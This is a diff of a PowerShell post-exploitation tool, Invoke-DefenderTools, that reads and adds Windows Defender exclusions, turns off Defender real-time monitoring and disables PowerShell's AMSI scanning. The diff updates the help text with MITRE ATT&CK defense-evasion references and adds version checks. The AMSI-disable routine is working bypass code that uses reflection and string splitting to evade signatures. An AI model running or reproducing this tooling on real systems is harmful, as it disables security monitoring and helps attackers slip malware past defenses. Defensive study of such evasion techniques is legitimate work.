@@ -2,121 +2,129 @@ function Invoke-DefenderTools {
 <#
                                           
 .SYNOPSIS
+	Several functions to aid in interacting with Windows Defender.
 
-Several functions to interact with Windows Defender for post-exploitation.
+.PARAMETER Help
+	Shows detailed help for each function.
 
-.PARAMETER help
-
-Shows detailed help for each function.
-
-.PARAMETER list
-
-Shows summary list of available functions.
+.PARAMETER List
+	Shows summary list of available functions.
 
 .PARAMETER GetExcludes
-
-Returns any currently configured files/paths/extensions/process excludes.
+	Gets any current exclude files/paths/extensions currently configured in Windows Defender via the Registry. 
 
 .PARAMETER AddExclude
-
-Adds a path exclude.
+	Adds a path exclude to Windows Defender. (Requires Elevation)    
 
 .PARAMETER DisableRtm
-
-Disables Real-Time Monitoring
+	Description: Disables Windows Defender Real-Time Monitoring. (Requires Elevation)
 
 .PARAMETER DisableAMSI
-
-Disables Powershell's AMSI Hook
+	Disables PowerShell's AMSI Hook
 
 .EXAMPLE
+	PS> Invoke-DefenderTools -GetExcludes
 
-PS> . .\Invoke-DefenderTools
+.EXAMPLE
+	PS> Invoke-DefenderTools -AddExclude
+	
+.EXAMPLE
+	PS> Invoke-DefenderTools -DisableRtm
 
-or
-
-PS> Import-Module Invoke-DefenderTools
-
-Functions:
-
-PS> Invoke-DefenderTools -GetExcludes
-PS> Invoke-DefenderTools -AddExclude -Path C:\windows\temp
-PS> Invoke-DefenderTools -DisableRtm
-PS> Invoke-DefenderTools -DisableAmsi
+.EXAMPLE
+	PS> Invoke-DefenderTools -DisableAmsi
+	
+.NOTES
+	Author: Fabrizio Siciliano (@0rbz_)
 
 #>
 [CmdletBinding()]
 param (
+	[Parameter(Position=1)]
 	[Switch]$Help,
 	[Switch]$List,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$GetExcludes,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$AddExclude,
 	[string]$Path,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$DisableRtm,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$DisableAmsi
 )
 
 	if ($Help -eq $True) {
 		Write @"
 		
- ### HELP ###
- ---------------------
- 
- Invoke-DefenderTools [-command] [-parameter(s)]
- Invoke-DefenderTools [-list]
- 
+ ### Invoke-DefenderTools Help ###
+ ---------------------------------
  Available Invoke-DefenderTools Commands:
  ----------------------------------------
- /----------------------------------------------------------------------/
+ |----------------------------------------------------------------------|
  | -GetExcludes                                                         |
- | -------------------------------------------------------------------- |
- |                                                                      |
- |  [*] Description: Gets any current exclude files/paths/extensions    |
- |      currently configured in Windows Defender via the Registry.      |
- |                                                                      |
- |  [*] Usage: Invoke-DefenderTools -GetExcludes                        |
- /----------------------------------------------------------------------/
-	   
- /----------------------------------------------------------------------/
+ |----------------------------------------------------------------------| 
+
+   [*] Description: Gets any current exclude files/paths/extensions    
+       currently configured in Windows Defender via the Registry.      
+
+   [*] Usage: Invoke-DefenderTools -GetExcludes
+   
+   [*] Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)
+   [*] Mitre ATT&CK Ref: T1089 (Disabling Security Tools)
+
+ |----------------------------------------------------------------------|
  | -AddExclude [-Path] path                                             |
- | -------------------------------------------------------------------- |
- |                                                                      |
- |  [*] Description: Adds a path exclude to Windows Defender.           |
- |      (Requires Elevation)                                            |
- |                                                                      |
- |  [*] Usage: Invoke-DefenderTools -AddExclude -Path C:\temp           |
- /----------------------------------------------------------------------/
-	  
- /----------------------------------------------------------------------/
+ |----------------------------------------------------------------------|
+
+   [*] Description: Adds a path exclude to Windows Defender.
+       (Requires Elevation)
+
+   [*] Usage: Invoke-DefenderTools -AddExclude -Path C:\temp
+   
+   [*] Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)
+   [*] Mitre ATT&CK Ref: T1089 (Disabling Security Tools)
+
+ |----------------------------------------------------------------------|
  | -DisableRTM                                                          |
- | -------------------------------------------------------------------- |
- |                                                                      |
- |  [*] Description: Disables Windows Defender Real-Time Monitoring.    |
- |      (Requires Elevation)                                            |
- |                                                                      |
- |      Note: Will pop an alert to the end user.                        |
- |                                                                      |
- |  [*] Usage: Invoke-DefenderTools -DisableRtm                         |
- /----------------------------------------------------------------------/
- 
- /----------------------------------------------------------------------/
+ |----------------------------------------------------------------------|
+
+   [*] Description: Disables Windows Defender Real-Time Monitoring.    
+       (Requires Elevation)                                            
+
+       Note: Will pop an alert to the end user.                        
+
+   [*] Usage: Invoke-DefenderTools -DisableRtm 
+
+   [*] Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)
+   [*] Mitre ATT&CK Ref: T1089 (Disabling Security Tools)   
+
+ |----------------------------------------------------------------------|
  | -DisableAMSI                                                         |
- | -------------------------------------------------------------------- |
- |                                                                      |
- |  [*] Description: Disables PowerShell's AMSI Hook                    |
- |                                                                      |
- |  [*] Usage: Invoke-DefenderTools -DisableAmsi                        |
- /----------------------------------------------------------------------/
+ |----------------------------------------------------------------------|
+
+   [*] Description: Disables PowerShell's AMSI Hook
+
+   [*] Usage: Invoke-DefenderTools -DisableAmsi
+   
+   [*] Mitre ATT&CK Ref: T1211 (Exploitation for Defense Evasion)
+   [*] Mitre ATT&CK Ref: T1089 (Disabling Security Tools)
+ 
+ \----------------------------------------------------------------------/
 
 "@
 	}
 	elseif ($List -eq $True) {
 		Write @"
 
- Invoke-DefenderTools Command List:
- ----------------------------------
+ Invoke-DefenderTools Brief Command Usage:
+ -----------------------------------------
  Invoke-DefenderTools -GetExcludes
- Invoke-DefenderTools -AddExclude [-Path] path
+ Invoke-DefenderTools -AddExclude -Path C:\temp
  Invoke-DefenderTools -DisableRtm
  Invoke-DefenderTools -DisableAMSI
  
@@ -154,6 +162,11 @@ param (
 		$h
 	}	
 	elseif ($AddExclude -and $Path) {
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
+		
 		$h = "`n### Invoke-DefenderTools(AddExclude) ###`n"
 		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 		
@@ -170,6 +183,11 @@ param (
 		}
 	}
 	elseif ($DisableRtm) {
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
+		
 		$h = "`n### Invoke-DefenderTools(DisableRtm) ###`n"
 		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 		
@@ -186,12 +204,17 @@ param (
 		}
 	}
 	elseif ($DisableAmsi) {
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
+		
 		# https://github.com/jakehomb/AMSI-Exec/blob/master/Invoke-AmsiExec.ps1
 		# https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
 		$h = "`n### Invoke-DefenderTools(DisableAmsi) ###`n"
-		
+			
 		$CheckAmz = [bool](([Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiInitFailed','NonPublic,Static').GetValue($null)))
-		
+
 		if ($CheckAmz) {
 			$h
 			Write " [+] Amsi is already disabled."
@@ -202,11 +225,11 @@ param (
 			Try {
 			
 				$a = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
-			
+
 				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiSession','NonPublic,Static').SetValue($null,$null)
-			
+
 				[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils').GetField('a'+'msiContext','NonPublic,Static').SetValue($null, [IntPtr]$a)
-				
+
 				$h
 				Write " [+] Disabled Amsi."
 				$h
